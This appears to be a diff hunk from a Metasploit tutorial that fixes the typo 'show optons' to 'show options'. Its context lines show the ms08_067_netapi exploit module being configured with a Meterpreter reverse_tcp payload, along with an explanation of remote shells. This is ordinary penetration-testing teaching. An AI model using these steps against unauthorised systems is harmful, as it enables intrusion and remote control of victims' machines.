@@ -233,7 +233,7 @@ msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
 
 **Note:** Meterpreter is a command shell built into Metasploit and allows the attacker to run remote commands on exploited systems. Reverse TCP is technique when the exploited computer establishes a connection back to the computer it was exploited from.
 
-Choosing a payload (actually, choosing modules in general) will add more options. Run `show optons` again:
+Choosing a payload (actually, choosing modules in general) will add more options. Run `show options` again:
 
  `msf exploit(ms08_067_netapi) > show options` 
 ```
